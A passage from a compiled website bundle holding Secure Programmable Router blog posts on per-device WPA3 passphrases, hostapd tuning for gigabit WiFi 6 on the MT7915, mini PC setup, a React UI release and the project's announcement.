device.\\n\\n```\\nsae_password=3rdPassphraseHere|mac=ff:ff:ff:ff:ff:ff\\n```\\n\\n### Devices Workflow\\n\\n#### First, go to the add device modal and add a device name and hit next\\n\\n![](/img/add_device_1.png)\\n\\n#### Next, scan the QR code  or type the passphrase on a new device\\n\\n![](/img/add_device_2.png)\\n\\n#### Upon connection the UI will notify success and the PSK will be assigned to the MAC\\n\\n![](/img/add_device_3.png)"},{"id":"wifi6","metadata":{"permalink":"/pages/blog/wifi6","source":"@site/blog/2022-04-13-gigabit-wifi-mt7915.md","title":"Gigabit WiFi with SPR & The 4x4 MT7915","description":"Intro","date":"2022-04-13T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"wifi6","permalink":"/pages/blog/tags/wifi-6"},{"inline":true,"label":"80211ax","permalink":"/pages/blog/tags/80211-ax"}],"readingTime":2.305,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"wifi6","title":"Gigabit WiFi with SPR & The 4x4 MT7915","authors":"ltsrad","tags":["SPR","wifi6","80211ax"]},"unlisted":false,"prevItem":{"title":"SPR Supports WPA3 with Multiple Passwords","permalink":"/pages/blog/multipsk and wpa3"},"nextItem":{"title":"Running SPR on a Mini PC with WiFi 6","permalink":"/pages/blog/spr_mini_pc"}},"content":"## Intro\\nIn this post we\'ll cover how to configure hostapd with the mt7915 to run 160 MHz channels over 5ghz.\\nThis allows stations to break gigabit speeds for WiFi with only 2 spatial streams.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Requirements\\n\\n- A 160Mhz capable card on the SPR device, for example [AsiaRF\'s AW7915-NP1](https://www.asiarf.com/shop/wifi-wlan/wifi_mini_pcie/wifi6-4t4r-dual-bands-selectable-mpcie-card-ieee802-11ax-ac-a-b-g-n-2-4g-5ghz-aw7915-np1/)\\n- 160MHz capable client wifi card, such as [Intel\'s AX210](https://www.intel.com/content/www/us/en/products/sku/204836/intel-wifi-6e-ax210-gig/specifications.html). [Intel\'s AX201 and AX200](https://ark.intel.com/content/www/us/en/ark/products/130293/intel-wifi-6-ax201-gig.html) also have 160Mhz support for 5ghz.\\n\\n## Preparation\\n\\n- Set up your AP device according to the [SPR Setup Guide](/docs/setup_guides/setup_run_spr)\\n- For mt7915, run a mainline kernel or a kernel with fixes from `https://github.com/openwrt/mt76` and the latest firmware. I\'ll publish some updates to building SPR with these in the near future. Fixes are needed for DFS support.\\n\\n## Hostapd configuration\\n\\n1. Modify `config/wifi/hostpad.conf`\\n2. Make sure vht_capab includes [VHT160] and [SHORT-GI-160]\\n3. Make sure to set vht_oper_chwidth/he_oper_chwidth set to 2.\\n4. For the channel configuration, the following are valid 160mhz centers on 5ghz: [50, 114, 163]. Set the vht/he_oper_centr_freq_seg0_idx to these values and the channel to the center value - 14.\\n5. Set ieee80211ax to 1\\n\\n```\\nctrl_interface=/state/wifi/control\\ncountry_code=US\\ninterface=wlan0\\nssid=TestLab\\nhw_mode=a\\nieee80211d=1\\nieee80211h=1\\nieee80211n=1\\nieee80211ac=1\\nieee80211ax=1\\nhe_su_beamformer=1\\nhe_su_beamformee=1\\nhe_mu_beamformer=1\\nwmm_enabled=1\\npreamble=1\\nht_capab=[LDPC][HT40+][HT40-][GF][SHORT-GI-20][SHORT-GI-40]\\nvht_capab=[MAX-MPDU-7991][SU-BEAMFORMEE][SU-BEAMFORMER][VHT160][RXLDPC][SHORT-GI-160][SHORT-GI-80][MAX-A-MPDU-LEN-EXP3][RX-ANTENNA-PATTERN][TX-ANTENNA-PATTERN][TX-STBC-2BY1][RX-STBC-1][MU-BEAMFORMER[[MU-BEAMFORMEE]\\nvht_oper_chwidth=2\\nhe_oper_chwidth=2\\nchannel=36\\nvht_oper_centr_freq_seg0_idx=50\\nhe_oper_centr_freq_seg0_idx=50\\nauth_algs=1\\nwpa=2\\nwpa_key_mgmt=WPA-PSK WPA-PSK-SHA256 SAE\\nrsn_pairwise=CCMP\\n\\n# Security parameters\\n\\n# Isolate stations and per-station group keys\\nap_isolate=1\\nmulticast_to_unicast=1\\n\\n# Mitigate krack attack\\nwpa_disable_eapol_key_retries=1\\n\\n# VLAN\\nper_sta_vif=1\\n\\n# Passwords\\n\\nsae_psk_file=/configs/wifi/sae_passwords\\nwpa_psk_file=/configs/wifi/wpa2pskfile\\n```\\n\\n2. Restart hostapd\\n\\n```\\nroot@pirouter:~/super# docker compose restart wifid\\n```\\n\\nIf anything has gone wrong, check the docker compose logs for the wifid service.\\n\\n\\n## Perf Test\\n\\nRunning iperf3 on the SPR device, and iperf3 on a client with AX210 chip, we see the following:\\n\\n#### On SPR:\\n`iw wls6 info`\\n\\n```\\nInterface wls6\\n        ifindex 5\\n        wdev 0x1\\n        addr 00:0a:52:07:32:c9\\n        ssid testlab\\n        type AP\\n        wiphy 0\\n        channel 100 (5500 MHz), width: 160 MHz, center1: 5570 MHz\\n        txpower 23.00 dBm\\n        multicast TXQ:\\n                qsz-byt qsz-pkt flows   drops   marks   overlmt hashcol tx-bytes        tx-packets\\n                0       0       246     0       0       0       0       27114           272\\n```\\n\\n`iperf3 -s`\\n\\n#### On the station:\\n\\n`iperf3 -c 192.168.2.1`\\n\\n\\n#### Performance results\\n\\n```\\nAccepted connection from 192.168.2.26, port 56156\\n[  5] local 192.168.2.1 port 5201 connected to 192.168.2.26 port 56158\\n[ ID] Interval           Transfer     Bitrate                                                         \\n[  5]   0.00-1.00   sec   139 MBytes  1.17 Gbits/sec                   \\n[  5]   1.00-2.00   sec   126 MBytes  1.06 Gbits/sec                  \\n[  5]   2.00-3.00   sec   141 MBytes  1.18 Gbits/sec                  \\n[  5]   3.00-4.00   sec   137 MBytes  1.15 Gbits/sec                  \\n[  5]   4.00-5.00   sec   152 MBytes  1.27 Gbits/sec                  \\n[  5]   5.00-6.00   sec   153 MBytes  1.28 Gbits/sec                  \\n[  5]   6.00-7.00   sec   155 MBytes  1.30 Gbits/sec                  \\n[  5]   7.00-8.00   sec   148 MBytes  1.24 Gbits/sec                  \\n[  5]   8.00-9.00   sec   145 MBytes  1.21 Gbits/sec                  \\n[  5]   9.00-10.00  sec   119 MBytes   995 Mbits/sec                                                  \\n[  5]  10.00-10.00  sec   482 KBytes  1.22 Gbits/sec                                                  \\n```"},{"id":"spr_mini_pc","metadata":{"permalink":"/pages/blog/spr_mini_pc","source":"@site/blog/2022-03-18-x64-support.md","title":"Running SPR on a Mini PC with WiFi 6","description":"Intro","date":"2022-03-18T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"x64","permalink":"/pages/blog/tags/x-64"},{"inline":true,"label":"80211ax","permalink":"/pages/blog/tags/80211-ax"}],"readingTime":2.6,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr_mini_pc","title":"Running SPR on a Mini PC with WiFi 6","authors":"ltsrad","tags":["SPR","x64","80211ax"]},"unlisted":false,"prevItem":{"title":"Gigabit WiFi with SPR & The 4x4 MT7915","permalink":"/pages/blog/wifi6"},"nextItem":{"title":"Supernetworks just Released a React User Interface","permalink":"/pages/blog/UI Push"}},"content":"## Intro\\n\\nIn the blog post we\'ll describe how to build and run SPR on a Mini-PC. And we\'ll use a WiFi 6 capable radio inside.\\n\\n\x3c!-- truncate --\x3e\\n\\n## First, get a Mini PC ready\\n\\n1. Identify a good mini PC to use. [Wilson](https://twitter.com/willy_wong) suggested\\na look at QOTOM\'s i3 broadwell routers.\\n\\n  The [g330](https://amzn.to/36qmZjI) is not bad. It\'s a fanless build with a TDP of 15W. One mini pci-e slot is dedicated to [mSATA](https://en.wikipedia.org/wiki/Serial_ATA#Mini-SATA_(mSATA)), and the other can be used to fit a wifi radio. It also has additional SATA available for one more storage drive.\\n\\n  <a href=\\"https://amzn.to/36qmZjI\\">\\n\\n  ![](https://m.media-amazon.com/images/I/61KcP6zQLsL._AC_SX679_.jpg)\\n\\n  </a>\\n\\n  WARNING: On this device, the mini-pcie slot has a tall post for half-sized cards that needs to be removed to fit thicker full sized WiFi cards.\\n\\n  2. Get a good WiFi radio.\\n\\n  We\'ll run with an 802.11ax card that works with Linux in AP mode (at least 802.11ac is recommended).\\n\\n  Mediatek is the disruptor in this space and supports AP mode on Linux. \\\\[NOTE: Many other cards will NOT work with ax in AP mode on Linux with open source drivers\\\\] . If you have recommendations please do not hesitate to reach out on the [matrix chat](https://matrix.to/#/#spr:matrix.org).  For the G330 Qotom, 2 antennas wires are provided to outside the case, so the 2x2 configuration is best.\\n\\n  The [MT7915](https://www.asiarf.com/shop/wifi-wlan/wifi_mini_pcie/wifi6-2t2r-dual-bands-dbdc-mpcie-card-11ax-mt7915-aw7915-npd/) can be purchased from AsiaRF.\\n\\n  <a href=\\"https://www.asiarf.com/shop/wifi-wlan/wifi_mini_pcie/wifi6-2t2r-dual-bands-dbdc-mpcie-card-11ax-mt7915-aw7915-npd/\\" >\\n\\n  ![](https://sp-ao.shortpixel.ai/client/to_webp,q_glossy,ret_img,w_400,h_400/https://www.asiarf.com/wp-content/uploads/2021/07/aw7915-npd-1_top.jpg)\\n\\n  </a>\\n\\n\\n\\n## Setup\\n\\nDownload and install Ubuntu Server. Since the WiFi 6 driver is a work in progress, we grabbed a daily release of [Jammy Jellyfish 22.04](https://cdimage.ubuntu.com/ubuntu-server/daily-live/current/jammy-live-server-amd64.iso) from the [Ubuntu Live](https://cdimage.ubuntu.com/ubuntu-server/daily-live/current/) page to get the latest fixes. Copy the installer to installation media (a flash drive) then plug it in and go.\\n\\nThen follow the [SPR Setup Guide](/docs/setup_guides/setup_run_spr).\\n\\nOur config/base/config.sh:\\n```\\n#!/bin/sh                                                                                                              \\nSSID_NAME=6lab                                                                                                         \\nSSID_INTERFACE=wlan1                                                                                                   \\n\\n#PPPIF=eth0                                                                                                            \\n#WANIF=ppp0\\n#PPP_VLANID=201\\n#PPP_PROVIDER=provider-config\\nWANIF=enp1s0\\nRUN_WAN_DHCP=true\\nRUN_WAN_DHCP_IPV=4\\n# Uncomment the next line if a second ethernet port goes to wired LAN\\n#LANIF=eth1\\nVLANIF=wlan1\\nVLANSIF=$VLANIF.\\n\\nLANIP=192.168.3.1\\nDNSIP=$LANIP\\nTINYNETSTART=192.168.3.4\\nTINYNETSTOP=192.168.3.255\\nTINYNETMASK=255.255.255.252\\nTINYSLASHMASK=30\\nDOCKERNET=172.17.0.0/16\\nDOCKERIF=docker0\\n\\nWIREGUARD_PORT=51280\\n#WIREGUARD_NETWORK=192.168.3.1/24\\n```\\n\\n## Configure hostapd for 802.11AX\\n\\nOn the SPR device, modify `configs/wifi/hostapd.conf` and add:\\n\\n```\\nieee80211ax=1\\nhe_su_beamformer=1\\nhe_su_beamformee=1\\nhe_mu_beamformer=1\\nhe_oper_chwidth=1 # 80mhz channel\\nhe_oper_centr_freq_seg0_idx=42\\n```\\n\\nRestart wifid\\n```\\ndocker compose restart wifid\\n```\\n\\n\\nConnect a wifi 6 client and verify HE codings are available\\n\\n```\\n# iw dev wlan1.4096 station dump -v  | grep bitrate\\n        tx bitrate:     1200.9 MBit/s 80MHz HE-MCS 11 HE-NSS 2 HE-GI 0 HE-DCM 0\\n        rx bitrate:     720.6 MBit/s 80MHz HE-MCS 7 HE-NSS 2 HE-GI 0 HE-DCM 0\\n```\\n\\n## Some Notes on the MT7915\\n\\nThe MT7915 is a Dual Mode driver. This means that it supports both 2Ghz and 5Ghz\\nfrequencies simultaneously. For our install the 2ghz interface is on `wlan0` and 5Ghz on `wlan1`. This is really wonderful, since one card can serve older IOT devices that only run on 2Ghz as well as more modern devices at high speeds.\\n\\nThe linux kernel driver is not yet as stable as it could be, so beware that it may not yet be production ready -- several assertions and crashes were noticed. The mainline kernel does not yet support radar scanning, however the code is available in the [openwrt development branch](https://github.com/openwrt/mt76)."},{"id":"UI Push","metadata":{"permalink":"/pages/blog/UI Push","source":"@site/blog/2022-01-19-min-ui.md","title":"Supernetworks just Released a React User Interface","description":"User Friendliness","date":"2022-01-19T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"UI","permalink":"/pages/blog/tags/ui"},{"inline":true,"label":"React","permalink":"/pages/blog/tags/react"},{"inline":true,"label":"Golang","permalink":"/pages/blog/tags/golang"}],"readingTime":2.35,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"UI Push","title":"Supernetworks just Released a React User Interface","authors":"ltsrad","tags":["SPR","UI","React","Golang"]},"unlisted":false,"prevItem":{"title":"Running SPR on a Mini PC with WiFi 6","permalink":"/pages/blog/spr_mini_pc"},"nextItem":{"title":"Announcing The SPR Project","permalink":"/pages/blog/first-blog-post"}},"content":"## User Friendliness\\n\\nThe SPR project started out as a series of bash scripts and configuration files. Adding new devices\\nwas a little bit error prone, as everything was done on the command line. Each device would\\nrequire a new, strong password, and each device needed to be added to a zone\'s configuration.\\nNext, hostapd had to be restarted to get WPA3 password reloading to work. It was hard to debug and not apparent if things failed.\\n\\nWhat would make SPR super useful, though, would be if it was easy to use. And a user interface can do that for us.\\n\\nSo this week, Supernetworks pushed out a [frontend](https://github.com/spr-networks/super/tree/main/frontend) for testing.\\n\\n\x3c!-- truncate --\x3e\\n\\n## This Release Delivers Basic UI Features\\n\\nThree functions are now available:\\n  - Add a new wireless device to the network\\n  - List devices\\n  - Set device access zones\\n\\nWhile these are simple things, and seemingly easy, SPR\'s services work together to build a network\\nthat is virtually unlike all other wifi setups available today. As a result, the base station service,\\nthe DHCP server, and the API need to work together to leverage their features so that users have\\na super smooth  experience.\\n\\n## See a Demo\\n\\n<div>\\n  <video width=\\"100%\\" height=\\"100%\\" playsInline muted controls src=\\"/pages/video/sprui.mp4\\" type=\\"video/mp4\\">\\n  </video>\\n</div>\\n\\n### How Devices are Connected to SPR\\n  * Each wireless device is on an isolated network, keyed in by their MAC address and passphrase\\n  * MAC/ARP spoofing is blocked by hardened firewall rules to completely stop ethernet/IP-based evasion for lateral movement\\n  * Zones specify the level of each individual device\'s access\\n  * Custom zones can create groups of devices that can intercommunicate without having full LAN access\\n  * Built in ad blocking with CoreDNS\\n\\n#### Some of the challenges were\\n  *  Laying down a solid foundation between the API and frontend to make adding new features great\\n  *  Supporting a smooth WPA3 experience, which uses a ZKP for authentication\\n  *  Making it fast and easy to add a device without having to also know or enter its MAC address ahead of time\\n\\n\\n## The Zones\\n\\nThe built in zones are\\n  - DNS for outbound DNS queries\\n  - WAN for outbound internet access\\n  - LAN for general access to all local devices\\n\\nWhen a user types in a new name, such as \\"Cameras\\",  NFTables verdict maps gets created\\nby the API. All of the members of the maps can send and receive IP traffic to one another,\\nbut do not get general access to the LAN.  In the future, custom firewall rules will be added\\nto further specify how the groups interact.\\n\\n## What\'s Next for the UI\\n\\nFor the road map, I\'m thinking about security features such as intrusion detection\\nor automated security scanning and fingerprinting, network debugging and bandwidth monitoring,\\nper-device ad blocking, and home automation."},{"id":"first-blog-post","metadata":{"permalink":"/pages/blog/first-blog-post","source":"@site/blog/2022-01-10-first-blog-post.md","title":"Announcing The SPR Project","description":"Hello, SPR","date":"2022-01-10T00:00:00.000Z","tags":[{"inline":true,"label":"SPR","permalink":"/pages/blog/tags/spr"},{"inline":true,"label":"Hello World","permalink":"/pages/blog/tags/hello-world"}],"readingTime":5.14,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"first-blog-post","title":"Announcing The SPR Project","authors":"ltsrad","tags":["SPR","Hello World"]},"unlisted":false,"prevItem":{"title":"Supernetworks just Released a React User Interface","permalink":"/pages/blog/UI Push"}},"content":"## Hello, SPR\\n\\nI\'m happy to start releasing the **Secure Programmable Router** project to the world. I\'ve been running my home WiFi\\nwith it for the past few months and I\'m beyond excited to give back to the open source community.\\nI started working on this project because I think that Linux provides a tremendous amount of agility and\\npower for secure home networking but I felt like there was no router project out there that pulled it all together.\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## The SPR project is about several things\\n\\n- A highly secure foundation to operate a home network where using the internet is safe and it\'s easy to see and control what IoT devices are up to when they are plugged in.\\n\\n- Making home privacy easy instead of begrudgingly sharing telemetry with big data companies.\\n\\n- Open source and empowering developers by lowering the barrier to entry for coding with home networking.\\n\\n- About reducing the barrier for entry.\\n\\n- Enabling scripting and rapid prototyping.\\n\\n- Adapting modern networking paradigms and tools that can meets today\'s needs.\\n\\n## How SPR Came To Be\\n\\nDuring the past year, I took a serious look at [opnsense](https://opnsense.org/) and [OpenWRT](https://openwrt.org/), and ordered over a dozen different wifi routers to set up my home network. I sat down and built and deployed my own OpenWRT images and to set up secure wifi networks to connect with a more serious firewall. What I found was that the setups I had managed to achieve were not only frustrating to manage, but when I went to test their security, I found time and time again that vendor wifi routers were insecure due to fundamental limitations with the network designs. On top of that, they were [riddled with software security holes](https://www.zerodayinitiative.com/blog/2021/11/1/pwn2ownaustin). Unfortunately, running the open source builds of OpenWRT often had degraded performance versus the proprietary vendor patches or required breaking secure boot.\\n\\nI felt frustrated because I felt like I had lost control over my own home network. I had only a basic idea of what I was running and what my devices were doing, let alone the routers themselves. Between smart bulbs and vacuum cleaners and home security cameras and speakers, TVs, gaming consoles, laptops, desktops, streaming devices, more routers, and work equipment, there was a lot of stuff that was online.\\n\\nI\'ve been working in computer security for over 15 years and I often get asked for how to set up a home network.\\n\\nThe best advice I could give people for their home wifi was to keep their mission critical systems on a dedicated wifi router, and plug that one into the main wifi router with all the other\\n\\"stuffs\\" that ultimately connects to the internet. This is awkward and requires switching networks or IGMP proxying to do discovery or zeroconf. This doesn\'t scale well across a multi-office home with repeaters and backhaul. It also doesn\'t scale well in an apartment where there\'s competition for radio bandwidth with neighbors for essentially one of only three coveted 80mhz channels on 5ghz.\\n\\nThe next best advice was to split out the \\"whatever\\" non-critical devices to the guest network, and the mission critical stuff on the main network. Hardening the guest network with isolation breaks discovery and streaming as well. In practice I found that most of the routers I looked at did not have good guest isolation anyway when enabled, something I will blog about later. No exploits are required, because more or less an attacker can just ask a router to send packets for them to work around hostapd\'s AP Isolation feature, and most of the routers will happily do what they do best, route the packets.\\n\\nAt the end of the day though, it\'s fundamentally a flawed idea to have a shared passphrase across many devices because that passphrase effectively lets devices spoof each other or attempt to intercept traffic, making it tough to truly firewall devices.\\n\\nSo then I started looking into enterprise wifi authentication: 802.1x  (EAP-PEAP, EAP-TLS, EAP-PWD). EAP-TLS really is the only secure way to do things since EAP-PEAP suffers from fundamental [man in the middle issues](https://datatracker.ietf.org/doc/html/draft-josefsson-pppext-eap-tls-eap-10#section-5.8) that were [never fixed](https://github.com/latelee/hostapd/commit/a190189d221aaef869ae2f52f7ead75b0c327995). Or EAP-PWD (which is almost wpa3) would be great,  if it was supported by more devices and drivers, and well with EAP-TLS, certificate management is pain.\\n\\nI really wished that one could just use a unique passphrase per device. Well, it turns out that yes, that works, and hostapd supports it out of the box. With some logic and [usability and correctness fixes](https://github.com/spr-networks/hostap/commit/279c5203e4c767701ac9fb7cf31624390437d854) to hostapd, and it was easy to seamlessly add new devices and their passphrases on the fly.\\n\\nOkay that was great. Next, I created strong device isolation with per-device subnets that could be configured to communicate with other subnets using forwarding rules. The resulting network was a bit too different than the spirit of the networking scripts in OpenWRT, and the patching became unreasonable to expect for upstream to accept, so I started from fresh ground.\\n\\nSPR is implemented for rapid iteration. Services are containerized so that developers can swap out core services or roll up new ones in a testable, reproducible manner. An API drives configuration to allow for customization. SPR Runs off of Ubuntu, with Docker containers, and manages the network with NFTables. It uses hostapd for the base station software, CoreDHCP for DHCP, CoreDNS for DNS, and supports Wireguard.\\n\\nSPR simply enables users to do better than today\'s status quo. It lets users run a hardened, secure network without restrictive drawbacks. It lets users connect their consumer electronics to the internet with the peace of mind that doing so does not weaken their home network security.\\n\\n## What\'s Next\\n\\nToday SPR runs as a proof of concept on a Raspberry Pi.  With a USB dongle it\'s well able to handle over a dozen wifi stations and serve data from the internet with rates up to 500mbps. Work is underway to expand to new systems.\\n\\nI\'m currently wrapping up a Web UI to make SPR user friendly. In the near future I\'ll be posting a road map for what\'s planned.\\n\\nWant to learn more and discuss? Join the [Discord Chat](https://discord.gg/EUjTKJPPAX)"}]}}')}}]);